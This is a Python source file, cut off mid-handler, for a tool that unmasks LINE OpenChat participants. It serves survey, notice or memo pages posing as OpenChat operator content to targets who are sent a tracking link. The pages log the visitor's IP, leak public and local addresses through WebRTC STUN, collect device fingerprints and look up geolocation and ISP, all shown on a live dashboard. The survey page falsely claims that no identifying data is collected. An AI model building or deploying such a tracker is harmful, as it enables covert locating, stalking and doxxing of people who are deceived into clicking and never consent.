#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
line_iptool.py — LINE オープンチャット参加者の IP 特定ツール (stdlib only)

仕組み:
  1) このツールで「追跡リンク」を発行する (例: https://xxx.trycloudflare.com/u1)
  2) オープンチャットのトーク / 1対1トークでターゲットに踏ませる
  3) 着信時に「接続元IP」を記録 + ブラウザ側 JS が WebRTC(STUN) で
     ローカル/グローバル IP も取得して送信する
  4) アンケートページは実際に「回答を送信」でき、回答内容も記録される
  5) ターミナルとダッシュボードの両方に、色分けされた判定付きで表示

判定の色:
  緑 検証OK   : WebRTCのグローバルIP = 接続元IP (実端末とほぼ確定)
  黄 IP相違   : WebRTCと接続元IPが不一致 (VPN/プロキシ/二重NAT等の可能性)
  水 v4/v6    : IPv4とIPv6の併用 (不一致に見えるが正常)
  灰 未検証   : WebRTC未取得 (LINE内蔵ブラウザ等)
  赤 BOT?     : リンクプレビュー等の自動アクセス

使い方:
  python line_iptool.py --tunnel --tokens u1,u2
  python line_iptool.py --no-color --port 8080
  python line_iptool.py --help
"""
from __future__ import annotations

import argparse
import atexit
import base64
import json
import os
import re
import shutil
import socket
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request
import webbrowser
from datetime import datetime, timedelta, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path




try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

APP_DIR = Path(__file__).resolve().parent
JST = timezone(timedelta(hours=9))

CFG = {
    "port": 8080,
    "tokens": ["main"],
    "page": "survey",
    "dash_key": "",
    "geo": True,
    "public_url": "",
    "color": False,
}

HITS: list[dict] = []
LOCK = threading.RLock()
PRINT_LOCK = threading.Lock()
GEO_CACHE: dict[str, dict] = {}
TUNNEL_PROC: subprocess.Popen | None = None

HITS_JSON = APP_DIR / "hits.json"
HITS_JSONL = APP_DIR / "hits.jsonl"
LINKS_TXT = APP_DIR / "links.txt"

PIXEL_GIF = base64.b64decode(
    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
)

# LINE 側のリンクプレビュー取得ボット判定 (LINEアプリ本体の UA は " Line/..." を含むので別扱い)
BOT_RE = re.compile(
    r"(linespider|linelinkbot|bot\b|crawler|spider|preview|externalhit|facebookexternalhit"
    r"|curl/|wget|python-requests|headless|lighthouse|monitor)",
    re.I,
)
LINE_APP_RE = re.compile(r"(\bLine/|LIFF|OpenChat|line\.me)", re.I)


# ---------------------------------------------------------------- colors
class C:
    R = "\033[0m"
    B = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YEL = "\033[93m"
    BLU = "\033[94m"
    MAG = "\033[95m"
    CYN = "\033[96m"
    GRY = "\033[90m"
    WHT = "\033[97m"


def enable_ansi() -> bool:
    """Windows のコンソールで ANSI エスケープを有効化する"""
    if os.name != "nt":
        return True
    try:
        import ctypes

        k = ctypes.windll.kernel32
        for handle_id in (-11, -12):  # stdout, stderr
            h = k.GetStdHandle(handle_id)
            mode = ctypes.c_uint32()
            if not k.GetConsoleMode(h, ctypes.byref(mode)):
                continue
            if not (mode.value & 0x0004):  # ENABLE_VIRTUAL_TERMINAL_PROCESSING
                k.SetConsoleMode(h, mode.value | 0x0004)
        return True
    except Exception:
        return False


def col(s: str, code: str) -> str:
    return f"{code}{s}{C.R}" if CFG["color"] else str(s)


def out(*lines: str) -> None:
    with PRINT_LOCK:
        print(*lines, flush=True)


# ---------------------------------------------------------------- utilities
def now_jst() -> str:
    return datetime.now(JST).strftime("%Y-%m-%d %H:%M:%S")


def is_private_ip(ip: str) -> bool:
    try:
        import ipaddress

        a = ipaddress.ip_address(ip)
        return a.is_private or a.is_loopback or a.is_link_local
    except Exception:
        return True


def ip_family(ip: str) -> int:
    return 6 if ip and ":" in ip else 4


def norm_ip(raw: str) -> str:
    ip = (raw or "").strip()
    if ip.startswith("[") and "]" in ip:
        ip = ip[1 : ip.index("]")]
    if ip.lower().startswith("::ffff:"):
        ip = ip[7:]
    if "%" in ip:
        ip = ip.split("%")[0]
    return ip


def lan_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def persist() -> None:
    try:
        tmp = HITS_JSON.with_suffix(".json.tmp")
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(HITS, f, ensure_ascii=False, indent=1)
        os.replace(tmp, HITS_JSON)
    except Exception as e:
        print(f"[warn] persist failed: {e}", file=sys.stderr)


def load_hits() -> None:
    if not HITS_JSON.exists():
        return
    try:
        data = json.loads(HITS_JSON.read_text(encoding="utf-8"))
        if isinstance(data, list):
            HITS.extend(data)
        print(f"[i] 既存の記録 {len(HITS)} 件を読み込みました")
    except Exception as e:
        print(f"[warn] load failed: {e}", file=sys.stderr)


def geo_lookup(ip: str) -> dict:
    """ip-api.com 無料版で地理情報を取得 (失敗しても致命的ではない)"""
    if not CFG["geo"]:
        return {}
    if is_private_ip(ip):
        return {"status": "private", "label": "プライベート / トンネル経由"}
    with LOCK:
        if ip in GEO_CACHE:
            return GEO_CACHE[ip]
    fields = (
        "status,message,country,countryCode,regionName,city,zip,lat,lon,"
        "timezone,isp,org,as,mobile,proxy,hosting,query"
    )
    url = f"http://ip-api.com/json/{urllib.parse.quote(ip)}?fields={fields}&lang=ja"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "curl/8"})
        with urllib.request.urlopen(req, timeout=6) as r:
            data = json.loads(r.read().decode("utf-8", "replace"))
    except Exception as e:
        data = {"status": "error", "message": str(e)}
    with LOCK:
        GEO_CACHE[ip] = data
    return data


def geo_plain(g: dict) -> str:
    """GeoIP情報をターミナル用の1行テキストにする"""
    if not g:
        return ""
    st = g.get("status")
    if st == "private":
        return g.get("label", "プライベート")
    if st != "success":
        return "取得失敗 (" + str(g.get("message", ""))[:40] + ")"
    place = " ".join(
        x for x in (g.get("country", ""), g.get("regionName", ""), g.get("city", "")) if x
    ).strip()
    parts = [place or "-"]
    if g.get("isp"):
        parts.append(str(g["isp"]))
    if g.get("as"):
        parts.append(str(g["as"]).split(" ")[0])  # AS番号だけ
    tags = []
    if g.get("mobile"):
        tags.append("モバイル回線")
    if g.get("hosting"):
        tags.append("DC/VPN")
    if g.get("proxy"):
        tags.append("Proxy")
    line = " / ".join(parts)
    if tags:
        line += "  [" + ",".join(tags) + "]"
    return line


def enrich_async(hit: dict) -> None:
    def work():
        g = geo_lookup(hit["ip"])
        if not g:
            return
        with LOCK:
            hit["geo"] = g
            first = not hit.get("geo_printed")
            hit["geo_printed"] = True
            persist()
        if first:
            out(f"      {col('├ Geo   :', C.CYN)} {col(geo_plain(g), C.WHT)}")

    threading.Thread(target=work, daemon=True).start()


# ---------------------------------------------------------------- verification
V_META = {
    "ok": ("検証OK", C.GRN),
    "mismatch": ("IP相違", C.YEL),
    "family": ("v4/v6併用", C.CYN),
    "bot": ("BOT?", C.RED),
    "unknown": ("未検証", C.GRY),
}


def verify_status(rec: dict) -> tuple[str, str]:
    """WebRTC の結果と接続元IPを突き合わせて「本当に本人の回線か」を判定"""
    if rec.get("maybe_bot"):
        return "bot", V_META["bot"][0]
    wr = rec.get("webrtc") or {}
    srflx = [x for x in (wr.get("srflx") or []) if x]
    conn = rec.get("ip", "")
    if not srflx:
        return "unknown", V_META["unknown"][0]
    ips = []
    for s in srflx:
        v = str(s)
        if v.startswith("[") and "]" in v:  # [IPv6]:port
            v = v[1 : v.index("]")]
        elif v.count(":") == 1:  # IPv4:port
            v = v.rsplit(":", 1)[0]
        ips.append(v)
    if conn in ips:
        return "ok", V_META["ok"][0]
    same_family = [x for x in ips if ip_family(x) == ip_family(conn)]
    if not same_family:
        return "family", V_META["family"][0]
    return "mismatch", V_META["mismatch"][0]


def verify_color(code: str) -> str:
    return V_META.get(code, V_META["unknown"])[1]


# ---------------------------------------------------------------- logging
def add_hit(kind: str, token: str, ip: str, headers: dict, client: dict | None) -> dict:
    """同一 IP + 同一トークン + 近接時刻の記録はマージする"""
    now = time.time()
    with LOCK:
        for h in reversed(HITS[-40:]):
            if h["ip"] == ip and h["token"] == token and now - h["ts_unix"] < 90:
                h["last"] = now_jst()
                if client:
                    h["client"].update({k: v for k, v in client.items() if v})
                persist()
                return h
        rec = {
            "id": f"{int(now*1000)}-{len(HITS)+1}",
            "ts_unix": now,
            "first": now_jst(),
            "last": now_jst(),
            "kind": kind,
            "token": token,
            "ip": ip,
            "ip_kind": "private" if is_private_ip(ip) else "public",
            "ua": headers.get("ua", ""),
            "lang": headers.get("lang", ""),
            "referer": headers.get("referer", ""),
            "is_line": bool(LINE_APP_RE.search(headers.get("ua", ""))),
            "maybe_bot": bool(BOT_RE.search(headers.get("ua", ""))),
            "webrtc": {},
            "client": dict(client or {}),
            "geo": {},
            "geo_printed": False,
            "answers": [],
        }
        HITS.append(rec)
        persist()
        try:
            with open(HITS_JSONL, "a", encoding="utf-8") as f:
                f.write(json.dumps(rec, ensure_ascii=False) + "\n")
        except Exception:
            pass

    w = rec["webrtc"] or {}
    code, label = verify_status(rec)
    tag = "LINEアプリ" if rec["is_line"] else ("自動アクセス" if rec["maybe_bot"] else "ブラウザ")
    out(
        f"{col('[HIT]', C.B)} {rec['first'][11:]} "
        f"{col('link='+token, C.CYN)} "
        f"{col('IP='+ip, C.WHT+C.B)} "
        f"{col('['+tag+']', C.GRY)} "
        f"{col('['+label+']', verify_color(code))}"
    )
    if w.get("srflx"):
        out(f"      {col('├ WebRTC:', C.MAG)} {col(','.join(w['srflx']), C.MAG)}")
    enrich_async(rec)
    return rec


def print_answer(token: str, ip: str, ans: dict) -> None:
    q1 = ans.get("q1") or "-"
    q2 = ans.get("q2") or "-"
    line = f"Q1={q1} / Q2={q2}"
    if ans.get("comment"):
        line += f" / コメント「{ans['comment']}」"
    out(f"      {col('└ 回答  :', C.YEL)} {col('link='+token, C.CYN)} {col(line, C.WHT)}  {col('('+ip+')', C.GRY)}")


def answers_plain(rec: dict) -> list[str]:
    res = []
    for a in rec.get("answers", []) or []:
        parts = [f"Q1={a.get('q1', '-')}", f"Q2={a.get('q2', '-')}"]
        if a.get("comment"):
            parts.append(f"「{a['comment']}」")
        res.append(" / ".join(parts))
    return res


# ---------------------------------------------------------------- HTML: pages
LANDING_COMMON = """<!DOCTYPE html>
<html lang="ja"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="robots" content="noindex,nofollow">
<title>__TITLE__</title>
<style>
  :root{--ln:#06c755;--txt:#1d1d1f;--sub:#6b6b70;--bg:#f5f6f8;}
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Hiragino Sans","Yu Gothic UI",Meiryo,sans-serif;
       background:var(--bg);color:var(--txt);-webkit-text-size-adjust:100%}
  .bar{background:var(--ln);color:#fff;padding:14px 16px;font-weight:700;font-size:16px;
       display:flex;align-items:center;gap:8px;position:sticky;top:0}
  .wrap{padding:16px;max-width:640px;margin:0 auto}
  .card{background:#fff;border-radius:14px;padding:18px;box-shadow:0 1px 3px rgba(0,0,0,.08);margin-bottom:14px}
  h1{font-size:18px;margin:0 0 10px}
  p{font-size:14px;line-height:1.75;color:#333;margin:0 0 10px}
  .sub{color:var(--sub);font-size:12.5px}
  .req{color:#e5484d;font-size:11px;font-weight:700;margin-left:6px}
  .btn{display:block;width:100%;padding:14px;border:0;border-radius:10px;background:var(--ln);
       color:#fff;font-size:16px;font-weight:700;margin-top:8px;cursor:pointer}
  .btn:active{opacity:.85}
  .btn[disabled]{background:#b9c2bd}
  .q{font-size:14px;font-weight:700;margin:14px 0 6px}
  label.opt{display:flex;gap:10px;align-items:center;padding:11px 12px;border:1px solid #e3e5e8;
       border-radius:10px;margin-bottom:8px;font-size:14px;background:#fbfbfc}
  label.opt.sel{border-color:var(--ln);background:#f0fbf3}
  input[type=radio]{accent-color:var(--ln);width:18px;height:18px;margin:0}
  textarea{width:100%;border:1px solid #e3e5e8;border-radius:10px;padding:11px;font-size:14px;
       font-family:inherit;resize:vertical;background:#fbfbfc}
  .hide{display:none}
  .done{text-align:center;padding:38px 10px}
  .done .ic{font-size:44px;color:var(--ln)}
  .foot{text-align:center;font-size:11.5px;color:#9a9aa0;padding:18px 0 30px}
</style></head><body>
<div class="bar">__BAR__</div>
<div class="wrap">__BODY__</div>
<div class="foot">© __YEAR__ __ORG__</div>
<script>
(function(){
  var T="__TOKEN__";
  function post(path, data, cb){
    var body=JSON.stringify(data||{});
    try{
      if(navigator.sendBeacon && !cb){ navigator.sendBeacon(path+"?t="+encodeURIComponent(T), new Blob([body],{type:"application/json"})); return; }
      fetch(path+"?t="+encodeURIComponent(T),{method:"POST",headers:{"Content-Type":"application/json"},body:body,keepalive:true})
        .then(function(r){ if(cb) cb(r); }).catch(function(){ if(cb) cb(null); });
    }catch(e){ if(cb) cb(null); }
  }
  function base(){
    var n=navigator, c=n.connection||{};
    return {
      ua:n.userAgent, platform:n.platform||"", lang:n.language||"",
      langs:(n.languages||[]).join(","), tz:Intl.DateTimeFormat().resolvedOptions().timeZone||"",
      screen:(screen.width+"x"+screen.height), dpr:window.devicePixelRatio||1,
      touch:n.maxTouchPoints||0, cores:n.hardwareConcurrency||0,
      mem:n.deviceMemory||0, net:c.effectiveType||"", nettype:c.type||"",
      dnt:n.doNotTrack||"", vw:innerWidth, vh:innerHeight
    };
  }
  post("/api/beacon", base());
  /* WebRTC: STUN でグローバルIP(srflx)とローカルIP(host)を取得 */
  function rtc(){
    return new Promise(function(res){
      var found={srflx:[],host:[],relay:[],mdns:[]};
      var pc;
      try{
        pc=new RTCPeerConnection({iceServers:[
          {urls:"stun:stun.l.google.com:19302"},
          {urls:"stun:stun1.l.google.com:19302"},
          {urls:"stun:stun.cloudflare.com:3478"}
        ]});
      }catch(e){ return res(found); }
      var t=setTimeout(finish,3500);
      function finish(){ clearTimeout(t); try{pc.close()}catch(e){}; res(found); }
      pc.onicecandidate=function(e){
        if(!e||!e.candidate){ return finish(); }
        var p=(e.candidate.candidate||"").split(" ");
        var addr=p[4]||"", typ=p[7]||"";
        if(!addr) return;
        if(/\\.local$/i.test(addr)){ if(found.mdns.indexOf(addr)<0) found.mdns.push(addr); return; }
        var k=(typ==="srflx")?"srflx":(typ==="relay")?"relay":"host";
        if(found[k].indexOf(addr)<0) found[k].push(addr);
      };
      try{ pc.createDataChannel("x"); }catch(e){}
      pc.createOffer().then(function(o){return pc.setLocalDescription(o)}).catch(finish);
    });
  }
  if(window.RTCPeerConnection){
    rtc().then(function(m){
      var d=base(); d.webrtc=m;
      if(m.srflx.length) d.public_hint=m.srflx.join(",");
      post("/api/beacon", d);
    });
  }
  /* アンケート回答の送信 */
  var btn=document.getElementById("ok");
  if(btn){
    document.querySelectorAll('label.opt').forEach(function(lb){
      var r=lb.querySelector('input[type=radio]');
      if(r) r.addEventListener("change", function(){
        document.querySelectorAll('input[name="'+r.name+'"]').forEach(function(x){
          x.closest('label.opt').classList.remove("sel");
        });
        lb.classList.add("sel");
      });
    });
    btn.addEventListener("click", function(){
      var q1=document.querySelector('input[name=q1]:checked');
      var q2=document.querySelector('input[name=q2]:checked');
      var cm=document.getElementById("comment");
      if(!q1||!q2){ alert("未回答の項目があります"); return; }
      var ans={q1:q1.value, q2:q2.value};
      if(cm && cm.value.trim()) ans.comment=cm.value.trim().slice(0,300);
      btn.disabled=true; btn.textContent="送信中...";
      post("/api/answer", ans, function(){
        var w=document.querySelector(".wrap");
        w.innerHTML='<div class="card done"><div class="ic">✓</div><h1>ご協力ありがとうございました</h1>'
          +'<p class="sub">回答を受け付けました。この画面は閉じて構いません。</p></div>';
        window.scrollTo(0,0);
      });
    });
  }
  window.__tracked=1;
})();
</script>
</body></html>"""


def render_page(token: str) -> str:
    year = datetime.now(JST).year
    if CFG["page"] == "news":
        title, bar, org = "【ご案内】オープンチャットからのお知らせ", "お知らせ", "OpenChat"
        body = """
        <div class="card">
          <h1>参加者のみなさまへ</h1>
          <p>いつもオープンチャットをご利用いただきありがとうございます。<br>
          下記の内容をご確認ください。</p>
          <p class="sub">・次回の開催日程が決定しました<br>
          ・ルールの一部を更新しました<br>
          ・よくある質問を追加しました</p>
          <button class="btn" id="ok">確認しました</button>
        </div>
        <div class="card"><p class="sub">※ このページは参加者向けのご案内です。外部に共有しないようお願いいたします。</p></div>
        """
    elif CFG["page"] == "memo":
        title, bar, org = "メモ", "メモ", "OpenChat"
        body = """
        <div class="card">
          <h1>共有メモ</h1>
          <p>オープンチャットで共有された資料です。内容をご確認ください。</p>
          <p class="sub">更新: __YEAR__/__MD__</p>
          <button class="btn" id="ok">確認しました</button>
        </div>
        """
    else:  # survey
        title, bar, org = "参加者アンケート | オープンチャット", "参加者アンケート", "OpenChat 運営"
        body = """
        <div class="card">
          <h1>かんたんアンケート（30秒）</h1>
          <p>今後のオープンチャット運営の参考にさせていただきます。匿名で回答できます。</p>

          <div class="q">Q1. このオープンチャットを知ったきっかけは？<span class="req">必須</span></div>
          <label class="opt"><input type="radio" name="q1" value="LINEの検索"><span>LINEの検索</span></label>
          <label class="opt"><input type="radio" name="q1" value="知人・友人の紹介"><span>知人・友人の紹介</span></label>
          <label class="opt"><input type="radio" name="q1" value="SNS・ブログ"><span>SNS・ブログ</span></label>

          <div class="q">Q2. 参加してどのくらいですか？<span class="req">必須</span></div>
          <label class="opt"><input type="radio" name="q2" value="1週間以内"><span>1週間以内</span></label>
          <label class="opt"><input type="radio" name="q2" value="1か月以内"><span>1か月以内</span></label>
          <label class="opt"><input type="radio" name="q2" value="それ以上"><span>それ以上</span></label>

          <div class="q">Q3. ご意見・ご要望（任意）</div>
          <textarea id="comment" rows="3" placeholder="自由にご記入ください" maxlength="300"></textarea>

          <button class="btn" id="ok">回答を送信する</button>
          <p class="sub" style="margin-top:12px">送信後、この画面は自動的に閉じても問題ありません。</p>
        </div>
        <div class="card"><p class="sub">個人が特定される情報は収集していません。ご協力ありがとうございます。</p></div>
        """
    body = body.replace("__YEAR__", str(year))
    body = body.replace("__MD__", datetime.now(JST).strftime("%m/%d"))
    html = LANDING_COMMON
    html = html.replace("__TITLE__", title).replace("__BAR__", bar).replace("__BODY__", body)
    html = html.replace("__ORG__", org).replace("__YEAR__", str(year))
    html = html.replace("__TOKEN__", token)
    return html


# ---------------------------------------------------------------- HTML: dashboard
DASH_HTML = """<!DOCTYPE html>
<html lang="ja"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>LINE OpenChat IPトラッカー</title>
<style>
 body{margin:0;background:#0f1115;color:#e6e6e6;font-family:-apple-system,"Segoe UI","Yu Gothic UI",Meiryo,sans-serif}
 header{padding:14px 18px;background:#161a20;border-bottom:1px solid #232a33;display:flex;flex-wrap:wrap;gap:12px;align-items:center}
 h1{font-size:15px;margin:0;font-weight:700}
 .muted{color:#8b949e;font-size:12px}
 .wrap{padding:16px;max-width:1500px;margin:0 auto;overflow-x:auto}
 .legend{display:flex;gap:14px;flex-wrap:wrap;margin:0 0 12px;font-size:12px;color:#8b949e}
 .legend i{display:inline-block;width:9px;height:9px;border-radius:2px;margin-right:5px}
 table{border-collapse:collapse;width:100%;font-size:12.5px}
 th,td{padding:9px 10px;border-bottom:1px solid #232a33;text-align:left;vertical-align:top}
 th{background:#161a20;position:sticky;top:0;font-weight:600;color:#9fb0c4;white-space:nowrap}
 tr:hover td{background:#141920}
 td:first-child{border-left:3px solid transparent}
 tr.v-ok td:first-child{border-left-color:#3fb950}
 tr.v-mismatch td:first-child{border-left-color:#d29922}
 tr.v-family td:first-child{border-left-color:#39c5cf}
 tr.v-bot td:first-child{border-left-color:#da3633}
 tr.v-unknown td:first-child{border-left-color:#3d444d}
 .ip{font-family:ui-monospace,Consolas,monospace;font-size:13px;color:#7ee787;white-space:nowrap}
 .ip.priv{color:#a5a5c0}
 .tok{background:#1b2a3a;color:#79c0ff;padding:1px 7px;border-radius:6px;font-family:ui-monospace,monospace;font-size:11.5px}
 .tag{display:inline-block;padding:1px 7px;border-radius:20px;font-size:11px;margin-right:4px;white-space:nowrap}
 .ver{font-weight:700;border-radius:6px;padding:2px 8px;display:inline-block;white-space:nowrap}
 .v-ok .ver{background:#0b3d22;color:#3fb950}
 .v-mismatch .ver{background:#3d320b;color:#d29922}
 .v-family .ver{background:#0b3a3d;color:#39c5cf}
 .v-bot .ver{background:#3d0b0b;color:#f85149}
 .v-unknown .ver{background:#21262d;color:#8b949e}
 .line{background:#0b3d22;color:#3fb950}.bot{background:#3d320b;color:#d29922}
 .priv{background:#2d2d3a;color:#a5a5c0}.pub{background:#0d2f46;color:#58a6ff}
 .ua{color:#8b949e;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 .rtc{color:#f0b3ff;font-family:ui-monospace,monospace;font-size:11.5px}
 .ans{color:#e3b341}
 .empty{padding:40px;text-align:center;color:#8b949e}
 .badge{background:#1f6feb22;border:1px solid #1f6feb55;color:#79c0ff;padding:3px 9px;border-radius:8px;font-size:12px}
 .links{font-family:ui-monospace,monospace;font-size:11.5px;color:#8b949e;word-break:break-all}
</style></head><body>
<header>
  <h1>LINE OpenChat IPトラッカー</h1>
  <span class="badge" id="cnt">0 hits</span>
  <span class="badge" id="okc" style="background:#3fb95022;border-color:#3fb95055;color:#3fb950">検証OK 0</span>
  <span class="muted" id="upd">--</span>
  <a class="muted" href="/api/hits?k=__KEY__" target="_blank" style="color:#58a6ff">JSON</a>
</header>
<div class="wrap">
 <div class="legend">
   <span><i style="background:#3fb950"></i>検証OK (WebRTCと接続元IPが一致)</span>
   <span><i style="background:#d29922"></i>IP相違 (VPN/プロキシ等)</span>
   <span><i style="background:#39c5cf"></i>v4/v6併用</span>
   <span><i style="background:#8b949e"></i>未検証</span>
   <span><i style="background:#da3633"></i>BOT / プレビュー</span>
 </div>
 <div id="lnk" class="links" style="margin-bottom:12px"></div>
 <table><thead><tr>
   <th>時刻</th><th>判定</th><th>リンク</th><th>接続元IP</th><th>Geo / 回線</th>
   <th>WebRTC(実IP候補)</th><th>回答</th><th>端末</th><th>UA</th>
 </tr></thead><tbody id="tb"></tbody></table>
 <div id="empty" class="empty">まだアクセスがありません。オープンチャットでリンクを共有してください。</div>
</div>
<script>
function esc(s){return (s==null?"":String(s)).replace(/[&<>"]/g,function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]})}
function geo(g){ if(!g||!g.status) return '<span class="muted">取得中...</span>';
  if(g.status==="private") return '<span class="muted">'+esc(g.label||"private")+'</span>';
  if(g.status!=="success") return '<span class="muted">取得失敗</span>';
  var l=[]; l.push(esc(((g.country||"")+" "+(g.regionName||"")+" "+(g.city||"")).trim()));
  if(g.isp) l.push(esc(g.isp));
  if(g.as) l.push(esc(String(g.as).split(" ")[0]));
  var t=[]; if(g.mobile) t.push('<span class="tag bot">モバイル回線</span>');
  if(g.hosting) t.push('<span class="tag bot">DC/VPN</span>'); if(g.proxy) t.push('<span class="tag bot">proxy</span>');
  if(t.length) l.push(t.join(""));
  return l.join("<br>");
}
function rtc(w){ if(!w) return '<span class="muted">-</span>'; var a=[];
  ["srflx","host","relay"].forEach(function(k){ if(w[k]&&w[k].length) a.push(k+": "+w[k].join(", ")); });
  return a.length? '<span class="rtc">'+esc(a.join("\\n")).replace(/\\n/g,"<br>")+'</span>' : '<span class="muted">未取得</span>';
}
function dev(c){ if(!c||!c.ua) return '<span class="muted">-</span>'; var a=[];
  if(c.tz)a.push(c.tz); if(c.screen)a.push(c.screen); if(c.net)a.push(c.net);
  return '<span class="muted">'+esc(a.join(" / "))+'</span>';
}
function ans(a){ return (a&&a.length)? '<span class="ans">'+a.map(esc).join("<br>")+'</span>' : '<span class="muted">-</span>'; }
async function tick(){
  try{
    var r=await fetch('/api/hits?k=__KEY__',{cache:'no-store'});
    var d=await r.json();
    document.getElementById('cnt').textContent=d.hits.length+' hits';
    document.getElementById('okc').textContent='検証OK '+d.hits.filter(function(h){return h.vcode==='ok'}).length;
    document.getElementById('upd').textContent='更新 '+new Date().toLocaleTimeString();
    var tb=document.getElementById('tb'); tb.innerHTML='';
    document.getElementById('empty').style.display=d.hits.length?'none':'block';
    d.hits.slice().reverse().forEach(function(h){
      var tr=document.createElement('tr');
      tr.className='v-'+(h.vcode||'unknown');
      var tags=[];
      if(h.is_line) tags.push('<span class="tag line">LINE</span>');
      if(h.maybe_bot) tags.push('<span class="tag bot">bot?</span>');
      tags.push('<span class="tag '+(h.ip_kind==='private'?'priv':'pub')+'">'+h.ip_kind+'</span>');
      tr.innerHTML='<td class="muted">'+esc(h.last)+'</td>'
        +'<td><span class="ver">'+esc(h.vlabel)+'</span></td>'
        +'<td><span class="tok">'+esc(h.token)+'</span></td>'
        +'<td class="ip '+(h.ip_kind==='private'?'priv':'')+'">'+esc(h.ip)+'<br>'+tags.join('')+'</td>'
        +'<td>'+geo(h.geo)+'</td>'
        +'<td>'+rtc(h.webrtc)+'</td>'
        +'<td>'+ans(h.answers_text)+'</td>'
        +'<td>'+dev(h.client)+'</td>'
        +'<td class="ua" title="'+esc(h.ua)+'">'+esc(h.ua)+'</td>';
      tb.appendChild(tr);
    });
    if(d.links && d.links.length){
      document.getElementById('lnk').innerHTML='<b>配布リンク:</b><br>'+d.links.map(function(x){
        return esc(x.token)+' → '+esc(x.url); }).join('<br>');
    }
  }catch(e){}
}
tick(); setInterval(tick,3000);
</script></body></html>"""


# ---------------------------------------------------------------- HTTP handler
class Handler(BaseHTTPRequestHandler):
    server_version = "LineIPTool/1.1"
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        return

    # ---------- helpers
    def client_ip(self) -> str:
        h = self.headers
        for k in ("cf-connecting-ip", "true-client-ip", "x-real-ip", "x-client-ip"):
            v = h.get(k)
            if v:
                return norm_ip(v.split(",")[0])
        xff = h.get("x-forwarded-for")
        if xff:
            return norm_ip(xff.split(",")[0])
        return norm_ip(self.client_address[0])

    def hdrs(self) -> dict:
        h = self.headers
        return {
            "ua": h.get("user-agent", ""),
            "lang": h.get("accept-language", ""),
            "referer": h.get("referer", ""),
        }

    def send_body(self, code: int, body: bytes, ctype: str, extra: dict | None = None):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
        self.send_header("X-Content-Type-Options", "nosniff")
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    def send_text(self, code: int, text: str, ctype="text/plain; charset=utf-8"):
        self.send_body(code, text.encode("utf-8"), ctype)

    def send_json(self, obj, code: int = 200):
        self.send_body(code, json.dumps(obj, ensure_ascii=False).encode("utf-8"),
                       "application/json; charset=utf-8")

    # ---------- routing
    def do_HEAD(self):
        self.do_GET()

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path.rstrip("/") or "/"
        qs = urllib.parse.parse_qs(parsed.query)
        tok = (qs.get("t") or [""])[0]

        if path in ("/favicon.ico",):
            return self.send_body(204, b"", "image/x-icon")
        if path == "/robots.txt":
            return self.send_text(200, "User-agent: *\nDisallow: /\n")
        if path == "/health":
            return self.send_text(200, "ok")

        if path in ("/x.gif", "/p.gif"):
            add_hit("gif", tok or "main", self.client_ip(), self.hdrs(), None)
            return self.send_body(200, PIXEL_GIF, "image/gif")

        if path == "/api/hits":
            k = (qs.get("k") or [""])[0]
            if CFG["dash_key"] and k != CFG["dash_key"]:
                return self.send_text(403, "forbidden")
            base = CFG["public_url"] or f"http://{lan_ip()}:{CFG['port']}"
            links = [{"token": t, "url": f"{base}/{t}"} for t in CFG["tokens"]]
            with LOCK:
                snapshot = []
                for h in HITS:
                    c = dict(h)
                    code, label = verify_status(h)
                    c["vcode"] = code
                    c["vlabel"] = label
                    c["answers_text"] = answers_plain(h)
                    snapshot.append(c)
                return self.send_json({"hits": snapshot, "links": links, "now": now_jst()})

        if path in ("/", "/dash"):
            k = (qs.get("k") or [""])[0]
            if CFG["dash_key"] and k != CFG["dash_key"]:
                return self.send_text(401, "ダッシュボードは ?k=<KEY> が必要です (起動ログ参照)")
            html = DASH_HTML.replace("__KEY__", CFG["dash_key"])
            return self.send_body(200, html.encode("utf-8"), "text/html; charset=utf-8")

        token = path.lstrip("/")
        if re.fullmatch(r"[A-Za-z0-9_-]{1,24}", token or ""):
            add_hit("page", token or "main", self.client_ip(), self.hdrs(), None)
            html = render_page(token or "main")
            return self.send_body(200, html.encode("utf-8"), "text/html; charset=utf-8")

        return self.send_text(404, "not found")

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path.rstrip("/") or "/"
        qs = urllib.parse.parse_qs(parsed.query)
        tok = (qs.get("t") or ["main"])[0]
        try:
            n = int(self.headers.get("content-length") or 0)
        except ValueError:
            n = 0
        raw = self.rfile.read(min(n, 8192)) if n else b""
        data = {}
        if raw:
            try:
                data = json.loads(raw.decode("utf-8", "replace"))
            except Exception:
                data = {"raw": raw.decode("utf-8", "replace")[:500]}

        if path == "/api/beacon":
            client = {}
            for k in ("ua", "platform", "lang", "langs", "tz", "screen", "dpr", "touch",
                      "cores", "mem", "net", "nettype", "vw", "vh"):
                if k in data:
                    client[k] = data[k]
            hdrs = self.hdrs()
            if data.get("ua"):
                hdrs["ua"] = data["ua"][:400]
            ip = self.client_ip()
            rec = add_hit("beacon", tok, ip, hdrs, client)
